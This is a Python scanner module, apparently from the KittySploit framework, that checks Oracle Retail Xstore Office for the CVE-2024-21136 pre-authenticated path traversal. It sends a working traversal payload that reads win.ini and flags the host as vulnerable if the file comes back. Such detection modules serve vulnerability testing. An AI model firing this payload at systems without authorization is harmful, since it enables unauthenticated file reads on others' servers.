#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vulnerability in the Oracle Retail Xstore Office product of Oracle Retail Applications (component: Security)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Retail Xstore Suite - Pre-authenticated Path Traversal Detection',
        'description': 'Vulnerability in the Oracle Retail Xstore Office product of Oracle Retail Applications (component: Security). Supported versions that are affected are 19.0.5, 20.0.3, 20.0.4, 22.0.0 and 23.0.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Retail Xstore Office. While the vulnerability is in Oracle Retail Xstore Office, attacks may significantly impact additional products (scope change).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'oracle', 'xstore', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.oracle.com/security-alerts/cpuapr2024.html',
            'https://www.synacktiv.com/en/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-21136',
        ],
        'cve': 'CVE-2024-21136',
    }

    def run(self):
        path = '/xstoremgwt/cheetahImages?imageId=..\\..\\..\\..\\windows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('for 16-bit app support', '[fonts]',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Oracle Retail Xstore Suite - Pre-authenticated Path Traversal detected', path=path)
            return True
        return False

